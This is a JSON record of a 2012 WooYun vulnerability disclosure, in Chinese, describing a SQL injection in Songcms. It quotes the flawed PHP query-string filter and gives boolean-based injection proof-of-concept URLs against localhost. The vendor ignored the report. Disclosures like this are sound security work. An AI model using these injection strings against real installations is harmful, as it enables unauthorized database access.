{"id": 18092, "wybug_id": "wooyun-2012-09474", "wybug_title": "Songcms Sql注入漏洞", "wybug_corp": "Songcms", "wybug_author": "Zvall", "wybug_date": "2012-07-11 11:42", "wybug_open_date": "2012-08-25 11:42", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-11：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-08-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 过滤不严谨呀！ 导致SQL注入！ 详细说明：  \nif($WebOpening==0) die(htmlspecialchars_decode($WebMaintenanceText));$QUERY = preg_replace(\"/[\\\\\\:\\*\\?\\\"\\'<>\\~\\(\\)\\[\\]\\{\\}\\s\\$]/\",'',$_SERVER['QUERY_STRING']);//这个正则不严谨呀!!!!冏$QUERY = explode('/',$QUERY);foreach ($QUERY as $key => $value){\t$sGET[substr($value,0,1)] = substr(trim($value),1);}if (!empty($sGET['w'])) $sGET['w'] = urldecode($sGET['w']);  解码后成功触发Lang(); sFile();\n   漏洞证明：  http://localhost/Song/?m1/fproducts/l1/w11%%27 and 1=1 and %27%%27=%27ｔｒｕｅhttp://localhost/Song/?m1/fproducts/l1/w11%%27 and 1=２ and %27%%27=%27ｆａｌｓｅ   修复方案：  你懂的！   版权声明：转载请注明来源 Zvall@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}